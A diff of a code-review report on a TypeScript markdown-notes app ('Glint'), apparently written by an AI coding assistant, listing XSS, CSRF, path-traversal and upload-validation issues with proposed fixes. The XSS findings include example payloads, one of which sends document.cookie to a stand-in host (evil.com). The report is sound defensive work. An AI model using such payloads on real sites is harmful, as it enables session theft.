@@ -1,412 +1,478 @@
-# Glint Codebase Review
+# Glint Code Review Report
 
-**Date:** 2026-01-23  
-**Scope:** Full codebase review for bugs, errors, dead code, duplication, and refactoring opportunities
+**Review Date**: 2026-01-23 (Updated)
+**Reviewer**: Claude Code (Opus 4.5)
+**Scope**: Full codebase review with focus on recent changes
+
+---
+
+## Executive Summary
+
+This review identified **20 issues** across security, architecture, and code quality concerns. The most critical findings are **XSS vulnerabilities** in client-side rendering and missing **CSRF protection** on state-changing API endpoints.
+
+| Severity | Count | Description |
+|----------|-------|-------------|
+| P0 (Critical) | 5 | XSS vulnerabilities, missing CSRF |
+| P1 (High) | 5 | Path traversal, race conditions, security weaknesses |
+| P2 (Medium) | 5 | Type safety, error handling, validation |
+| P3 (Low) | 5 | Code quality, consistency, maintainability |
+
+### Recent Improvements (Fixed Since Last Review)
+
+The following issues from the previous review have been addressed:
+
+- [x] XSS in page title rendering (`src/renderer.ts`) - Fixed with `escapeHtml()`
+- [x] Incomplete code path in editor sessions - Removed dead code
+- [x] Debug logging in production server - Removed hooks
+- [x] Untyped shareService parameter - Now properly typed
+- [x] Excessive `any` in widget handlers - Added proper MDAST/HAST types
+- [x] Missing git error handling - Now surfaces errors via SSE toasts
+- [x] File watcher race condition - Now debounced (300ms)
+- [x] Hardcoded theme list - Extracted to `AVAILABLE_THEMES` constant
+- [x] GlintEditor declared as `any` - Proper type declarations added
+- [x] Empty setupEventListeners() - Removed
+- [x] Unused contentDir parameter - Now used for getConfigPath()
+- [x] No validation on task toggle API - Zod validation added
+- [x] Silent catch in storage exists() - Now logs unexpected errors
+- [x] Hard-coded config path in theme update - Uses getConfigPath()
+- [x] Memory leak in editor Vim commands - Static registration with cleanup
+
+---
+
+## Critical Issues (P0)
+
+### 1. XSS Vulnerability in Comment Widget
+
+**File**: `src/widgets/comment.ts:94-126`
+**Confidence**: 95%
+
+User-generated content (author names, snippets, timestamps) is interpolated directly into HTML without sanitization.
+
+```typescript
+// Lines 94-108 - Unescaped snippet
+html += `<span class="comment-header-snippet">${snippet}</span>`;
+
+// Lines 125-126 - Unescaped author and timestamp
+html += `<div class="comment-meta"><span class="comment-author">${msg.author}</span>...`;
+```
+
+**Attack Vector**: Malicious markdown content:
+```markdown
+` ``comment
+<img src=x onerror=alert(document.cookie)>@2026-01-23:12:00 malicious content
+` ``
+```
+
+**Fix**: Import and use `escapeHtml` from `src/utils/html.ts`:
+```typescript
+import { escapeHtml } from '../utils/html.js';
+
+html += `<span class="comment-header-snippet">${escapeHtml(snippet)}</span>`;
+html += `<span class="comment-author">${escapeHtml(msg.author)}</span>`;
+```
+
+---
+
+### 2. XSS Vulnerability in Share Modal
+
+**File**: `src/client/share.ts:27-29, 144-164`
+**Confidence**: 92%
+
+Share labels and toast messages are inserted via `innerHTML` without escaping.
+
+```typescript
+// Line 27-29 - Toast messages
+toast.innerHTML = `
+    <span class="toast-message">${message}</span>
+`;
+
+// Line 154 - Share labels
+shareList.innerHTML = shares.map(share => {
+    return `<span class="share-label-text">${share.label || 'Untitled Share'}</span>`;
+}).join('');
+```
+
+**Fix**: Create a client-side escape function or use `textContent`:
+```typescript
+function escapeHtml(text: string): string {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+```
+
+---
+
+### 3. XSS Vulnerability in Task View
+
+**File**: `src/client/task-view.ts:260-300`
+**Confidence**: 90%
+
+Task descriptions from markdown files are rendered without escaping.
+
+```typescript
+// Line 291
+<a href="${link}" class="glint-task-content">${task.description}</a>
+```
+
+**Attack Vector**: Malicious task in markdown:
+```markdown
+- [ ] <img src=x onerror=fetch('https://evil.com?c='+document.cookie)>
+```
+
+---
+
+### 4. XSS Vulnerability in Journal View
+
+**File**: `src/client/journal-view.ts:40-55`
+**Confidence**: 88%
+
+Journal entry content is rendered via innerHTML without escaping:
+
+```typescript
+html += `<div class="journal-snippet">${entry.snippet}</div>`;
+```
+
+---
+
+### 5. Missing CSRF Protection
+
+**File**: `src/server/routes/api.ts:138-181, 221-298`
+**Confidence**: 85%
+
+State-changing endpoints (`/api/save`, `/api/upload`, `/api/shares`, `/api/task/toggle`) lack CSRF token validation. While `sameSite: 'lax'` cookies provide partial protection, they don't defend against all attack vectors.
+
+**Impact**: Attackers can trick authenticated users into making unintended requests.
+
+**Fix**: Implement CSRF token middleware:
+```typescript
+// Generate token on auth
+const csrfToken = crypto.randomBytes(32).toString('hex');
+request.session.csrfToken = csrfToken;
+
+// Validate on POST/PUT/DELETE
+const clientToken = request.headers['x-csrf-token'];
+if (clientToken !== request.session.csrfToken) {
+    return reply.code(403).send({ error: 'Invalid CSRF token' });
+}
+```
+
+---
+
+## High Priority Issues (P1)
+
+### 6. Path Traversal Risk in Storage Providers
+
+**Files**: `src/storage/local.ts:26-33`, `src/storage/git.ts:52-58`
+**Confidence**: 82%
+
+The `resolvePath()` method checks that paths stay within `basePath`, but symlinks or Windows path edge cases could potentially bypass this.
+
+```typescript
+private resolvePath(relativePath: string): string {
+    const resolved = path.resolve(this.basePath, relativePath);
+    if (!resolved.startsWith(this.basePath)) {
+        throw new Error('Access denied: Path outside base directory');
+    }
+    return resolved;
+}
+```
+
+**Fix**: Add symlink resolution and normalize paths:
+```typescript
+private resolvePath(relativePath: string): string {
+    const normalized = path.normalize(relativePath).replace(/^(\.\.(\/|\\|$))+/, '');
+    const resolved = path.resolve(this.basePath, normalized);
+    const realBase = fs.realpathSync(this.basePath);
+    if (!resolved.startsWith(realBase + path.sep) && resolved !== realBase) {
+        throw new Error('Access denied: Path outside base directory');
+    }
+    return resolved;
+}
+```
+
+---
+
+### 7. SSE Connection Memory Leak
+
+**File**: `src/server/sse.ts:6-17`
+**Confidence**: 88%
+
+SSE clients are tracked in a Set but dead connections may accumulate if the `close` event doesn't fire properly.
+
+**Fix**: Add heartbeat and error handling:
+```typescript
+const heartbeat = setInterval(() => {
+    try {
+        reply.raw.write(':heartbeat\n\n');
+    } catch (err) {
+        clearInterval(heartbeat);
+        clients.delete(reply);
+    }
+}, 30000);
+
+request.raw.on('error', () => {
+    clearInterval(heartbeat);
+    clients.delete(reply);
+});
+```
+
+---
+
+### 8. Weak Optimistic Locking
+
+**File**: `src/server/routes/api.ts:154-167`
+**Confidence**: 83%
+
+The hash check for preventing edit conflicts is optional and uses MD5:
+
+```typescript
+if (body.hash) {  // Optional!
+    const existingHash = crypto.createHash('md5').update(existingContent).digest('hex');
+}
+```
+
+**Fix**: Make hash checking mandatory and use SHA-256.
+
+---
+
+### 9. Missing Upload Validation
+
+**File**: `src/server/routes/api.ts:221-298`
+**Confidence**: 85%
+
+File uploads lack validation for:
+- File type/extension whitelist
+- Maximum file size
+- Malicious content (especially SVG with embedded scripts)
+
+```typescript
+const ext = path.extname(filename) || '.png';  // No validation!
+```
+
+**Fix**:
+```typescript
+const ALLOWED_IMAGE_TYPES = ['.png', '.jpg', '.jpeg', '.gif', '.webp'];
+const MAX_IMAGE_SIZE = 10 * 1024 * 1024; // 10MB
+
+const ext = path.extname(filename).toLowerCase();
+if (!ALLOWED_IMAGE_TYPES.includes(ext)) {
+    return reply.code(400).send({ error: 'Invalid file type' });
+}
+```
+
+---
+
+### 10. Git Commit Debounce Race Condition
+
+**File**: `src/storage/git.ts:174-194`
+**Confidence**: 80%
+
+The `pendingCommit` flag check at the start of `scheduleCommit()` can cause writes to be missed:
+
+```typescript
+private scheduleCommit(): void {
+    if (this.pendingCommit) return;  // Second write during pending is ignored
+    this.pendingCommit = true;
+    // ...
+}
+```
+
+**Fix**: Always reset the timer on new writes, regardless of pending state.
+
+---
+
+## Medium Priority Issues (P2)
+
+### 11. Excessive `any` Type Usage
+
+**Files**: 28 files with 77 occurrences
+**Confidence**: 100%
+
+Despite recent improvements, widespread use of `any` remains.
+
+**Top offenders**:
+- `src/client/editor.ts` - 8 occurrences
+- `src/storage/git-utils.ts` - 8 occurrences
+- `src/client/editor-sessions.ts` - 6 occurrences
+- `src/server/routes/documents.ts` - 6 occurrences
+
+---
+
+### 12. Inconsistent Error Response Format
+
+**Files**: API routes
+**Confidence**: 88%
+
+Error responses vary in format:
+```typescript
+reply.code(400).send({ error: 'Message' });      // Object
+reply.code(404).send('Not Found');               // String
+reply.code(500).send({ error: 'Failed', details: err });  // Object with details
+```
+
+**Fix**: Standardize with an error response helper.
+
+---
+
+### 13. Missing Request Body Validation
+
+**Files**: Various API routes
+**Confidence**: 85%
+
+While `src/server/routes/tasks.ts` now uses Zod validation, other routes still use unsafe type assertions:
+
+```typescript
+// src/server/routes/api.ts:139
+const body = request.body as { path: string; content: string; hash?: string };
+```
+
+---
+
+### 14. File Tree Rebuild Could Miss Updates
+
+**File**: `src/server.ts:181-193`
+**Confidence**: 75%
+
+While debouncing was added (good!), if a rebuild is in progress when new changes occur, those changes won't trigger a new rebuild.
+
+**Fix**: Track rebuild state and queue pending rebuilds.
+
+---
+
+### 15. Toast HTML Not Escaped in Scripts
+
+**File**: `src/renderer/scripts.ts:59-62`
+**Confidence**: 85%
+
+The global toast function uses innerHTML with potentially user-controlled message content from SSE:
+
+```typescript
+toast.innerHTML = \`
+    <span class="toast-message">\${message}</span>
+\`;
+```
+
+While the message currently comes from error.message, this should be escaped.
+
+---
+
+## Low Priority Issues (P3)
+
+### 16. Console.log in Production Code
+
+**Files**: Multiple client files
+**Confidence**: 100%
+
+Debug logging statements remain:
+- `src/client/editor-sessions.ts:109,115,240,246`
+- `src/renderer/scripts.ts:100,104`
+
+---
+
+### 17. Magic Numbers
+
+**Files**: Multiple
+**Confidence**: 95%
+
+Hardcoded values without explanation:
+- `2000` ms debounce in `git.ts:193`
+- `300` ms debounce in `server.ts:185`
+- `5` line buffer in `editor-sessions.ts:139`
+
+**Fix**: Extract to named constants.
+
+---
+
+### 18. Duplicate Code in Storage Providers
+
+**Files**: `src/storage/local.ts`, `src/storage/git.ts`
+**Confidence**: 95%
+
+Both providers have nearly identical implementations for file operations.
+
+**Fix**: Extract common logic to a base class.
+
+---
+
+### 19. Missing JSDoc on Public APIs
+
+**Files**: Most exported functions
+**Confidence**: 100%
+
+Public APIs lack documentation.
+
+---
+
+### 20. Redundant Git Method Wrappers
+
+**File**: `src/storage/index.ts:278-320`
+**Confidence**: 90%
+
+Four nearly identical methods for git operations with repeated error checking.
+
+**Fix**: Create a single `getGitProvider()` helper.
+
+---
+
+## Architecture Recommendations
+
+### Immediate Actions (This Week)
+
+1. **Fix XSS vulnerabilities** (P0) - Add `escapeHtml` to all user content rendering
+2. **Implement CSRF protection** (P0) - Add token-based validation
+3. **Add upload validation** (P1) - Whitelist file types, check sizes
+4. **Fix SSE memory leak** (P1) - Add heartbeat mechanism
+
+### Short-term Improvements (This Month)
+
+1. **Eliminate remaining `any` types** - Target the 77 occurrences
+2. **Standardize error handling** - Create error response utilities
+3. **Add input validation** - Apply Zod schemas to all API endpoints
+4. **Extract storage base class** - Reduce code duplication
+
+### Long-term Goals
+
+1. **Security scanning** - Add ESLint security plugin, run npm audit
+2. **API documentation** - Generate OpenAPI spec from route definitions
+3. **Test coverage** - Add tests for security-critical paths
+
+---
+
+## Files Changed Since Last Review
+
+| File | Status | Changes |
+|------|--------|---------|
+| `src/server.ts` | Improved | Debounced file tree rebuild, SSE error forwarding, removed debug hooks |
+| `src/storage/git.ts` | Improved | Added onError callback, improved error propagation |
+| `src/storage/index.ts` | Improved | Error handler registration, better error logging |
+| `src/client/editor.ts` | Improved | Fixed Vim memory leak with static registration |
+| `src/client/editor-sessions.ts` | Improved | Proper type declarations, removed dead code |
+| `src/server/routes/api.ts` | Improved | Uses getConfigPath for theme updates |
+| `src/server/routes/tasks.ts` | Improved | Zod validation for task toggle |
+| `src/widgets/task.ts` | Improved | Proper MDAST/HAST types |
+| `src/widgets/types.ts` | Improved | Added CustomTextNode, HASTElement types |
+| `src/renderer/scripts.ts` | Improved | Added error toast for SSE |
+| `src/renderer/sidebar.ts` | Improved | Uses AVAILABLE_THEMES constant |
+| `src/config.ts` | Improved | Exports AVAILABLE_THEMES |
+| `src/client/types.ts` | Improved | GlintEditor type declarations |
+| `src/client/task-view.ts` | Improved | Removed empty method |
 
 ---
 
 ## Summary
 
-| Severity | Count |
-|----------|-------|
-| 🔴 Critical | 2 |
-| 🟠 High | 6 |
-| 🟡 Medium | 12 |
-| 🔵 Low | 8 |
-
----
-
-## 🔴 Critical Issues
-
-### 1. XSS Vulnerability in Page Title Rendering
-
-**File:** `src/renderer.ts:99`
-
-```typescript
-<h1>${title}</h1>
-```
-
-The `title` variable is interpolated directly into HTML without escaping. Frontmatter titles containing `<script>` tags would execute.
-
-**Fix:** Use `escapeHtml(title)` (already imported in the module).
-
----
-
-### 2. Incomplete Code Path in Editor Sessions
-
-**File:** `src/client/editor-sessions.ts:261-268`
-
-```typescript
-// Adjust cursor position if initialLine was provided
-if (activeEditor.editor && typeof initialRelativeLine === 'number') {
-    const offset = startLine - effectiveStartLine;
-    const newRelativeLine = initialRelativeLine + offset;
-    // We'll set it in the editor if the constructor didn't handle it
-    // But wait, the constructor logic I wrote above passed 'initialLine'.
-    // I need to check how to pass it correctly in the options object above.
-    // Re-doing the constructor call below to include this logic cleanly.
-}
-```
-
-This `if` block contains only comments and no actual implementation. This is dead code that suggests an incomplete feature.
-
-**Fix:** Either implement the cursor adjustment or remove the dead block.
-
----
-
-## 🟠 High Severity Issues
-
-### 3. Debug Logging in Production Server
-
-**File:** `src/server.ts:101-117`
-
-```typescript
-fastify.addHook('onRequest', async (request, reply) => {
-    console.log(`[REQ] ${method} ${url} | Auth: ${isAuth} | Cookie: ${!!cookie} | Token: ${!!auth}`);
-});
-fastify.addHook('onResponse', async (request, reply) => {
-    console.log(`[RES] ${method} ${url} | Status: ${status} | Time: ${time}ms`);
-});
-```
-
-Verbose debug logging on every request. This should be behind a `DEBUG` flag or removed.
-
-**Fix:** Wrap in `if (process.env.DEBUG)` or remove entirely.
-
----
-
-### 4. Untyped `shareService` Parameter
-
-**File:** `src/server/routes/api.ts:15`
-
-```typescript
-shareService: any,
-```
-
-The `shareService` is typed as `any` throughout the API routes, losing type safety.
-
-**Fix:** Import and use proper type: `ShareService` from `../share.js`.
-
----
-
-### 5. Excessive Use of `any` Types in Widget Handlers
-
-**File:** `src/widgets/task.ts:98, 110, 147, 169`
-Multiple node objects are typed as `any` to work around strict MDAST/HAST typing:
-
-```typescript
-const checkboxNode: any = { ... }
-const metaNode: any = hasMeta ? { ... }
-const contentRow: any = { ... }
-const headerNode: any = { ... }
-```
-
-**Recommendation:** Create proper interfaces for custom MDAST nodes with `hName`/`hProperties`.
-
----
-
-### 6. Missing Error Handling in Git Auto-Commit
-
-**File:** `src/storage/git.ts:183-190`
-
-```typescript
-this.commitTimer = setTimeout(async () => {
-    try {
-        await gitUtils.gitCommit(this.basePath, this.commitMessage);
-    } catch (err) {
-        console.error('[GitStorageProvider] Auto-commit failed:', err);
-    }
-    this.pendingCommit = false;
-}, 2000);
-```
-
-Errors during auto-commit are silently logged but never surfaced to the user. Failed commits could lead to data loss.
-
-**Fix:** Emit an event or set a flag that can be checked by the UI.
-
----
-
-### 7. Race Condition in File Watcher
-
-**File:** `src/server.ts:181-215`
-The watcher callback rebuilds the file tree on every change without debouncing:
-
-```typescript
-storageManager.watch('', async (event, filename) => {
-    // ...
-    fileTree = await buildFileTree(storageManager, '', titleCache);
-});
-```
-
-Rapid file changes (e.g., git operations) could trigger many concurrent rebuilds.
-
-**Fix:** Debounce the watcher callback.
-
----
-
-### 8. Hardcoded Theme List Duplicated
-
-**Files:**
-
-- `src/server/routes/api.ts:115`
-- `src/renderer/sidebar.ts:16`
-
-```typescript
-const themes = ['default', 'everforest-dark', 'nord', 'gruvbox-dark', 'catppuccin-mocha', 'solarized-light'];
-```
-
-Same list appears in multiple places.
-
-**Fix:** Extract to `src/config.ts` as `AVAILABLE_THEMES` constant.
-
----
-
-## 🟡 Medium Severity Issues
-
-### 9. Duplicated Dashboard HTML
-
-**Observation:** Prior to refactoring (now partially cleaned), dashboard HTML was duplicated in:
-
-- `src/server.ts` (catch-all route)
-- `src/server.ts` (dashboard route)
-- `src/server/routes/tasks.ts`
-
-The `/d/tasks` refactoring improved this but some duplication may remain.
-
-**Fix:** Create a `renderDashboard()` helper function.
-
----
-
-### 10. Redundant Git Method Wrappers
-
-**File:** `src/storage/index.ts:269-313`
-Four nearly identical methods for git operations:
-
-```typescript
-async getGitStatus() { ... throw new Error('Git operations require...') }
-async gitSync() { ... throw new Error('Git operations require...') }
-async gitPull() { ... throw new Error('Git operations require...') }
-async gitPush() { ... throw new Error('Git operations require...') }
-```
-
-**Fix:** Create a single `getGitProvider()` method that throws, then call git methods on that.
-
----
-
-### 11. `GlintEditor` Declared as Global `any`
-
-**File:** `src/client/editor-sessions.ts:7`
-
-```typescript
-declare const GlintEditor: any;
-```
-
-Loses all type safety for editor operations.
-
-**Fix:** Create proper type declaration for `GlintEditor` class.
-
----
-
-### 12. Empty `setupEventListeners()` Method
-
-**File:** `src/client/task-view.ts:33-36`
-
-```typescript
-setupEventListeners() {
-    // We handle general clicks like presets here
-    // Task-specific clicks are handled by injectTaskInteractions
-}
-```
-
-Method is completely empty and can be removed.
-
----
-
-### 13. Unused `contentDir` Parameter
-
-**File:** `src/server/routes/api.ts:13`
-
-```typescript
-contentDir: string,
-```
-
-The `contentDir` parameter is passed but never used in the function body.
-
-**Fix:** Remove unused parameter.
-
----
-
-### 14. Magic Numbers in Display Math Fix
-
-**File:** `src/markdown.ts:28-41`
-The display math regex and transformation logic uses hardcoded patterns without constants.
-
-**Fix:** Extract regex patterns as named constants.
-
----
-
-### 15. Potential Memory Leak in Editor
-
-**File:** `src/client/editor.ts:261-312`
-Vim commands are registered globally via `Vim.defineEx()` and `Vim.defineAction()` on every editor instantiation. These are never cleaned up on editor destruction.
-
-**Fix:** Store command references and unregister in `destroy()`.
-
----
-
-### 16. Inconsistent Path Handling
-
-**Files:** Various
-Some code uses `path.join()` (OS-specific), others use `path.posix.join()` (always forward slashes). For URL paths, should consistently use posix.
-
----
-
-### 17. No Input Validation on Task Toggle API
-
-**File:** `src/server/routes/tasks.ts:51-54`
-
-```typescript
-const { sourcePath, lineNumber, newState } = request.body as {
-    sourcePath: string,
-    lineNumber: number,
-    newState?: string
-};
-```
-
-No validation that `lineNumber` is positive integer or `newState` is valid.
-
-**Fix:** Add zod schema validation.
-
----
-
-### 18. Silent Catch in Storage `exists()`
-
-**File:** `src/storage/index.ts:172`
-
-```typescript
-} catch { }
-```
-
-Empty catch blocks suppress all errors, not just ENOENT.
-
-**Fix:** Check specifically for `ENOENT` error code.
-
----
-
-### 19. `activeEditor.editor` Property Access
-
-**File:** `src/client/editor-sessions.ts:261`
-
-```typescript
-if (activeEditor.editor && typeof initialRelativeLine === 'number')
-```
-
-The `GlintEditor` class doesn't expose `.editor` property (it uses `this.view`).
-
----
-
-### 20. Hard-Coded Config Path in Theme Update
-
-**File:** `src/server/routes/api.ts:127`
-
-```typescript
-await storage.write('.glint/config.json', JSON.stringify(newConfig, null, 4));
-```
-
-Always writes to `.glint/config.json` regardless of actual config location.
-
-**Fix:** Use `getConfigPath()` from config module.
-
----
-
-## 🔵 Low Severity Issues
-
-### 21. Console.log Statements in Client Code
-
-**Files:** Various client files
-Numerous `console.log` statements for debugging that should use a debug flag.
-
----
-
-### 22. Import of Unused `NotFoundError`
-
-**File:** `src/server.ts:33`
-
-```typescript
-import { isForbiddenError, isNotFoundError, NotFoundError } from './utils/errors.js';
-```
-
-`NotFoundError` is imported but never used.
-
----
-
-### 23. Unused `fsSync` Import (Conditional)
-
-**File:** `src/storage/git.ts:7`
-`fsSync` is imported but only used for `watch()`. Could be dynamically imported.
-
----
-
-### 24. Missing Return Type Annotations
-
-Many exported functions lack explicit return type annotations, relying on inference.
-
----
-
-### 25. Inconsistent Naming: `canEdit` vs `requireAccess`
-
-Access control helpers have inconsistent naming patterns across files.
-
----
-
-### 26. Large File Sizes
-
-- `src/client/editor.ts` (477 lines) - Could split into separate modules for theme, keybindings, context expansion
-- `src/server.ts` (490 lines) - Route handlers could be further extracted
-
----
-
-### 27. Missing JSDoc Comments
-
-Most functions lack documentation comments describing parameters and behavior.
-
----
-
-### 28. Test Coverage Unknown
-
-No test files were found for many critical modules. The `src/tests/` directory exists but coverage is unclear.
-
----
-
-## Refactoring Opportunities
-
-### High Priority
-
-1. **Extract Dashboard Rendering** - Create shared `renderDashboardPage()` function
-2. **Type ShareService Properly** - Add proper types throughout API routes
-3. **Create Widget Node Types** - Define proper MDAST extension interfaces
-4. **Consolidate Theme Constants** - Single source of truth for available themes
-
-### Medium Priority
-
-5. **Extract Route Handlers** - Move inline route handlers in `server.ts` to route files
-2. **Create Git Operation Wrapper** - DRY up storage manager git methods
-3. **Add Validation Schemas** - zod schemas for all API request bodies
-4. **Debounce File Watcher** - Prevent rapid rebuilds on batch changes
-
-### Nice to Have
-
-9. **Split Editor Module** - Separate concerns in editor.ts
-2. **Add Debug Logger** - Replace console.log with configurable logger
-3. **Document Public APIs** - Add JSDoc to exported functions
-
----
-
-## Positive Observations
-
-- **Clean Separation of Concerns:** Renderer, storage, and routes are well-separated
-- **Good TypeScript Usage:** Most core types are well-defined
-- **Consistent Code Style:** Formatting is consistent across files
-- **Smart Caching:** HTML cache with mtime validation is well-implemented
-- **Widget Architecture:** Extensible plugin-like system for markdown extensions
-- **Context Expansion:** Editor bandaids already partially implemented in `editor.ts`
+The codebase has improved significantly since the last review:
+- **15 issues fixed** from the previous review
+- Better type safety with proper MDAST/HAST and GlintEditor types
+- Improved error handling with SSE error surfacing
+- Race conditions addressed with debouncing
+
+However, **security hardening remains the top priority**:
+- XSS vulnerabilities in client-side widgets need immediate attention
+- CSRF protection should be implemented
+- Upload validation is missing
+
+The `escapeHtml` utility exists in `src/utils/html.ts` but is not used consistently. A client-side equivalent should be created and used throughout the client code.
+
+**Next Review**: Schedule after security fixes are implemented.
